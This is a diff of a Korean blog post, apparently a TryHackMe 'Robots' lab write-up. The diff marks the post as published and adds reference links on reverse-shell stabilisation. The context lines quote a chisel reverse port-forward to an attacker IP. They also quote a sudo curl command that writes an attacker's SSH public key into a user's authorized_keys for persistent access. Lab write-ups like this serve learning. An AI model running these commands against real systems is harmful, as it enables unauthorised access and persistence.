@@ -8,7 +8,7 @@ tags: [tryhackme, wargame]
 sitemap:
   changefreq: monthly
   priority: 0.5
-published: false
+
 ---
 
 ## 1. 정찰 및 초기 웹 서비스 분석 (Reconnaissance)
@@ -144,3 +144,11 @@ chisel client <공격자 ip>:52528 R:3306:172.18.0.2:3306
 `sudo -u dolivaw /usr/bin/curl 127.0.0.1/ -o /dev/null http://<attacker_ip>/id_rsa.pub -o /home/dolivaw/.ssh/authorized_keys` 명령어를 실행하여, 공격자의 공개 키를 dolivaw 사용자의 authorized_keys 파일에 기록합니다.
 
 - 최종 권한 획득: 공격자는 자신의 개인 키를 사용하여 dolivaw 계정으로 SSH 접속에 성공합니다. (이를 통해 최종 Root 권한을 얻는 과정을 진행하게 됩니다.)
+
+
+
+#### 참고
+<https://saeed0x1.medium.com/stabilizing-a-reverse-shell-for-interactive-access-a-step-by-step-guide-c5c32f0cb839>
+<https://velog.io/@agnusdei1207/Shell-%EC%95%88%EC%A0%95%ED%99%94>
+<https://p0lestar.github.io/posts/Shell-Stabilization/>
+<https://hg2lee.tistory.com/entry/Robots-TryHackMe>
